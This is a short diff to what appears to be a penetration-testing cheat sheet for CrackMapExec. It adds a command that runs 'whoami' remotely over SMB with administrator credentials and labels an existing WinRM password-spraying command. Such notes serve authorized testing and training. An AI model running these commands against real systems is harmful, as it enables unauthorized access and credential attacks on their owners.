@@ -27,6 +27,13 @@ sudo apt-get -y install crackmapexec
 crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
 ```
 
+##### SMB Command Execution
+
+```shell-session
+crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
+```
+##### WinRM Password Spraying
+
 ```shell-session
 crackmapexec winrm 10.129.42.197 -u user.list -p password.list
 ```
